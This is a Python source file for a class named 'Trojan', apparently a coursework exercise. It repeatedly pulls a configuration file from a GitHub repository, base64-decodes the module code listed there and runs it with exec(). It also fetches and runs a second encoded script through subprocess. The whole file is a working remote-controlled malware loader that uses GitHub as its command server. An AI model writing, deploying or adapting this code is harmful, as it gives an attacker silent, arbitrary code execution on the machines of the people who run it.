from github import Github
import json
import time
import base64
import subprocess
import platform

class Trojan:
    def __init__(self, repository_name, file_path, access_token):
        self.repository_name = repository_name
        self.file_path = file_path
        self.access_token = access_token
        self.os_checker = OSChecker()

    def run_os_checker(self):
        self.os_checker.run(self.access_token, self.repository_name)

    def read_json_file(self):
        try:
            g = Github(self.access_token)
            repo = g.get_repo(self.repository_name)
            file_content = repo.get_contents(self.file_path).decoded_content
            json_data = json.loads(file_content)
            return json_data
        except Exception as e:
            print(f"Error retrieving JSON file: {e}")
            return None

    @staticmethod
    def base64_to_text(encoded_string):
        decoded_bytes = base64.b64decode(encoded_string)
        decoded_text = decoded_bytes.decode('utf-8')
        return decoded_text

    def execute_module(self, module):
        module_activation = module.get("active")
        module_name = module.get("name")
        duration = module.get("duration", 0)
        module_os = module.get("OS_type")
        encoded_module = module.get("path")
        cross_platform = module.get("cross_platform")

        if (
            module_name
            and duration > 0
            and encoded_module
            and module_activation
            and module_os == platform.system() or cross_platform
        ):
            print(f"Executing module '{module_name}' for {duration} seconds...")
            decoded_module = self.base64_to_text(encoded_module)

            try:
                exec(decoded_module, globals())
                time.sleep(duration)
                print(f"Module '{module_name}' execution completed.")
            except Exception as e:
                print(f"Error executing module '{module_name}': {e}")

    def run(self):
        try:
            while True:
                json_data = self.read_json_file()
                if json_data and "modules" in json_data:
                    modules = json_data["modules"]
                    for module in modules:
                        self.execute_module(module)
                else:
                    pass
                time.sleep(25)
        except KeyboardInterrupt:
            pass


class OSChecker:
    @staticmethod
    def run(access_token, repository_name):
        g = Github(access_token)
        repo = g.get_repo(repository_name)
        file_content = repo.get_contents('OSChecker.py').decoded_content.decode('utf-8')
        code = Trojan.base64_to_text(file_content)
        subprocess.run(['python', '-c', code])


if __name__ == "__main__":
    repository_name = "rsecurity12/python_opdracht"
    file_path = "Configuration.json"
    access_token = ''

    trojan = Trojan(repository_name, file_path, access_token)
    trojan.run_os_checker()
    trojan.run()
